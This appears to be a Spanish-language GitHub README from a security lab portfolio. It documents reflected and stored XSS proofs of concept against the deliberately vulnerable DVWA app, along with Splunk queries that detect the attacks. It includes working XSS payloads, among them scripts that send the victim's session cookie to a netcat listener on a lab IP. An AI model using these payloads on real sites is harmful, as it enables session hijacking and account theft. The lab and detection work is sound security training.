# Laboratorio de Seguridad Web: Explotación y Monitoreo de XSS (Reflected & Stored) en DVWA

Este repositorio documenta las pruebas de concepto (PoC) de vulnerabilidades **Cross-Site Scripting (XSS)** realizadas sobre la aplicación **DVWA (Damn Vulnerable Web Application)**, la interacción con el entorno atacante **Kali Linux** y el monitoreo centralizado de eventos mediante el **SIEM Splunk**.

---

## Parte 1: Reflected XSS

### 1. Pruebas de Ejecución Local
Inyección de scripts básicos para verificar falta de sanitización:

* **Inyección de Alerta Básica:**
  ```html
  <script>alert('XSS')</script>
  ```
  ![Alerta Básica](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/XSS%20Attack%20-%20alert().png)

* **Lectura de Cookies:**
  ```html
  <script>alert(document.cookie)</script>
  ```
  ![Alerta Cookie](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/XSS%20Attack%20-%20alert()%20message.png)

### 2. Exfiltración de Cookies
Listener en Kali Linux (`nc -lnvp 8000`) + Payload:

```html
<script>new Image().src='http://192.168.0.36:8000/robo?cookie='+encodeURIComponent(document.cookie);</script>
```

![Reporte PHPSESSID](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/XSS%20Attack%20-%20PHPSESSID%20.png)
![Mensaje PHPSESSID](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/XSS%20Attack%20-%20PHPSESSID%20message.png)

### 3. Monitoreo en Splunk
```spl
index=main sourcetype=access_combined clientip=192.168.0.36 uri="*xss*"
| table _time, method, uri, status
| sort _time
```
![Splunk Reporte XSS](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/Splunk%20-%20XSS%20Attack.png)

---

## Parte 2: Stored XSS

### 1. Inyección del Payload Persistente
```html
<script>new Image().src='http://192.168.0.36:8000/steal?cookie='+encodeURIComponent(document.cookie);</script>
```

---

## Parte 3: Detección y Análisis Forense en Splunk

### Auditoría de Inyecciones Stored XSS (Peticiones POST)
```spl
index=main sourcetype=access_combined uri_path="*/vulnerabilities/xss_s/*" method=POST
| table _time, clientip, method, uri_path, status
```

![Reporte Splunk Stored XSS](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/Splunk%20-%20XSS%20Stored%20Attack.png)
![Reporte Splunk Full Stored XSS](https://raw.githubusercontent.com/TomiGuasta/SocLab-Portfolio/main/homelab-soc/docs/DVWA-Attacks/XSS/Splunk%20Full%20%20-%20XSS%20Stored%20Attack.png)

---

## Resumen del ataque

```
┌───────────────────┬────────────────────────────────────────────────────────┐
│ Técnica           │ Impacto                                                │
├───────────────────┼────────────────────────────────────────────────────────┤
│ Reflected XSS     │ Exfiltración inmediata mediante clic de usuario        │
│ Stored XSS        │ Persistencia y exfiltración automática en cada carga   │
│ Detección Splunk  │ Identificación mediante logs de Apache (POST requests) │
└───────────────────┴────────────────────────────────────────────────────────┘
```
